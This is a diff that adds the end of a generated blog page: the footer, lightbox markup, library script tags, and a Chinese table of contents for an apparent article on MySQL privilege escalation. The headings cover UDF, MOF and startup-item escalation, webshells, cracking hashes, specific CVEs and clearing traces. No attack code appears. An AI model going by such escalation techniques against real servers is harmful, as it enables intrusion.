+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#mysql权限获取">MySQL权限获取</a>
+      <ol>
+        <li><a href="#数据库操作权限">数据库操作权限</a></li>
+        <li><a href="#基于注入获取的webshell权限">基于注入获取的webshell权限</a></li>
+        <li><a href="#hash破解">Hash破解</a></li>
+        <li><a href="#已知漏洞利用">已知漏洞利用</a>
+          <ol>
+            <li><a href="#yassl缓冲区溢出">yaSSL缓冲区溢出</a></li>
+            <li><a href="#cve-2012-2122">CVE-2012-2122</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#udf提权">UDF提权</a>
+      <ol>
+        <li><a href="#手动实现">手动实现</a>
+          <ol>
+            <li><a href="#动态链接库">动态链接库</a></li>
+            <li><a href="#插件目录">插件目录</a></li>
+            <li><a href="#写入动态链接库">写入动态链接库</a></li>
+            <li><a href="#创建函数-执行命令">创建函数-执行命令</a></li>
+            <li><a href="#清理痕迹">清理痕迹</a></li>
+          </ol>
+        </li>
+        <li><a href="#msf自动化实现">msf自动化实现</a></li>
+        <li><a href="#udf-shell">UDF shell</a>
+          <ol>
+            <li><a href="#udf大马">UDF大马</a></li>
+            <li><a href="#navicat-自带脚本">Navicat 自带脚本</a></li>
+          </ol>
+        </li>
+        <li><a href="#反弹端口提权">反弹端口提权</a></li>
+      </ol>
+    </li>
+    <li><a href="#mof提权">MOF提权</a>
+      <ol>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#手工实现">手工实现</a>
+          <ol>
+            <li><a href="#mof文件">mof文件</a></li>
+            <li><a href="#写文件">写文件</a></li>
+            <li><a href="#痕迹清理">痕迹清理</a></li>
+            <li><a href="#msf自动化实现-1">msf自动化实现</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#启动项提权">启动项提权</a>
+      <ol>
+        <li><a href="#启动项路径">启动项路径</a></li>
+        <li><a href="#写入启动项">写入启动项</a></li>
+        <li><a href="#msf自动化实现-2">msf自动化实现</a></li>
+      </ol>
+    </li>
+    <li><a href="#cve-2016-6663">CVE-2016-6663</a>
+      <ol>
+        <li><a href="#影响范围">影响范围</a></li>
+        <li><a href="#利用">利用</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
